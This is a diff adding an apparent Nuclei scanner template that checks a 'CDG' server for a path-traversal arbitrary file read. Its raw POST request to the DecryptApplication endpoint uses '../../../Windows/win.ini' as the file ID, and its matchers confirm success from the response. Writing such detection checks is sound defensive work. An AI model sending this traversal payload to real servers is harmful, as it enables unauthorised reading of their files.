@@ -1,0 +1,28 @@
+id: CDG-ViewDecyptFile-ReadAnyFile
+
+info:
+  name: CDG-ViewDecyptFile-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    CDG-ViewDecyptFile-ReadAnyFile
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=ViewDecyptFile&decryptFileId=../../../Windows/win.ini&fileName=1.png
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "fonts]"
+          - "extensions]"
